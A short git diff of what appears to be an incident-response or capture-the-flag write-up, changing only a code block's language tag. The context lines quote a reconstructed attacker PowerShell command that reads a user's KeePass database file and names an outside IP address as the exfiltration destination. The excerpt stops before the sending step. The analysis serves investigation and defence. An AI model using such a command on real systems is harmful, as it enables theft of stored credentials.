@@ -185,7 +185,7 @@ keepass
 >What is the encoding used during the exfiltration attempt of the sensitive file?
 
 I reconstructed PowerShell command to exfiltrate the keepass database file as shown in the following code block.
-```PowerShell
+```powershell
 $file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; 
 $destination = \"167.71.211.113\"; 
 $bytes=[System.IO.File]::ReadAllBytes($file);
